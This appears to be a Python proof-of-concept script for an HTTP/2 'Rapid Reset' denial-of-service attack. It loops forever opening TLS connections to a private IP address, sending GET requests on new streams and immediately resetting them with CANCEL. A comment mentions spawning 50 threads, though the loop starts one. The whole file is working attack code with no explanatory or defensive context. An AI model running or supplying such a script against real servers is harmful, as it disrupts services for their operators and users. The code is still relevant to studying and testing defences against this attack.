import threading
import socket
import collections

try:
    # using Python 3.10+
    from collections.abc import MutableSet
    collections.MutableSet = collections.abc.MutableSet
    from collections.abc import MutableMapping
    collections.MutableMapping = collections.abc.MutableMapping
except ImportError:
    # using Python 3.10-
    from collections import MutableSet
    from collections import MutableMapping
    
from h2.connection import H2Connection
from h2.events import RequestReceived, ResponseReceived, StreamReset
from h2.config import H2Configuration
import ssl
from h2.errors import ErrorCodes

def root_function(url='192.168.101.79'):
    while True:
        try:
            # Create a TCP connection
            sock = socket.create_connection((url, 80))

            # Wrap the socket for TLS
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2'])
            sock = ctx.wrap_socket(sock, server_hostname=url)

            # Make sure we're using HTTP/2
            assert sock.selected_alpn_protocol() == 'h2'

            # Create HTTP/2 connection
            config = H2Configuration(client_side=True)
            conn = H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            # Create a new stream
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(
                stream_id,
                [(':method', 'GET'), (':authority', url), (':path', '/'), (':scheme', 'https')],
            )
            sock.sendall(conn.data_to_send())

            # Read some data
            while True:
                data = sock.recv(65535)
                if not data:
                    break

                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, ResponseReceived):
                        # Cancel the stream with error code for CANCEL
                        #conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)
                    #elif isinstance(event, StreamReset):
                        #print(f"Stream {event.stream_id} cancelled.")
                        conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)
                sock.sendall(conn.data_to_send())
        except Exception as e:
            print(f"An error occurred: {e}")


# Create 50 threads running root_function
threads = []
for i in range(1):
    thread = threading.Thread(target=root_function)
    thread.start()
    threads.append(thread)

# Keep the main thread alive
for thread in threads:
    thread.join()